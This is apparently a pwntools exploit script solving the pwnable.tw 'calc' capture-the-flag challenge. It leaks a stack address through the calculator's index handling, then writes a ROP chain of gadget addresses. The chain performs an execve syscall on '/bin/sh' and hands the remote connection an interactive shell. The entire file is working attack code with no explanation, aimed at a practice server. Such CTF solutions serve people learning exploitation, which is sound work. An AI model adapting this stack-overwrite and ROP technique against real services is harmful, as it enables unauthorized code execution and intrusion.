from pwn import *
context.log_level = "debug"

#r = process("./calc")
r = remote("chall.pwnable.tw", 10100)
#print r.pid
#pause()

p_eax = 0x0805c34b
p_ebx = 0x080481d1
p_ecx_ebx = 0x080701d1
p_edx = 0x080701aa
syscall = 0x8049a21

r.recvline()
r.sendline("+360")
x = r.recvline().strip()
x = int(x) + 0xffffffff + 1
info("rbp: " + hex(x))
ret = x - 0x1c
info("ret: " + hex(ret))
retaddr = 0x8049499

sh = '+361+'
x = p_edx - retaddr
sh += str(x)
r.sendline(sh)

r.recvline()
sh = '+362-'
x = x
sh += str(x)
r.sendline(sh)

r.recvline()
sh = '+363+'
x = p_ecx_ebx - x
sh += str(x)
r.sendline(sh)

r.recvline()
sh = '+364-'
x = x
sh += str(x)
r.sendline(sh)

r.recvline()
sh = '+365-'
y = ret + 0x20 - 0x100000000
x = x - y
sh += str(x)
print hex(x)
r.sendline(sh)

r.recvline()
sh = '+366-'
x = x - p_eax
print hex(x)
sh += str(x)
r.sendline(sh)

r.recvline()
sh = '+367-'
x = x - 11
sh += str(x)
r.sendline(sh)

r.recvline()
sh = '+368+'
x = syscall - x
sh += str(x)
r.sendline(sh)

r.recvline()
sh = '+369+'
x = 0x6e69622f - x
sh += str(x)
r.sendline(sh)

r.recvline()
sh = '+370-'
x = x - 0x0068732f
sh += str(x)
r.sendline(sh)

r.interactive()

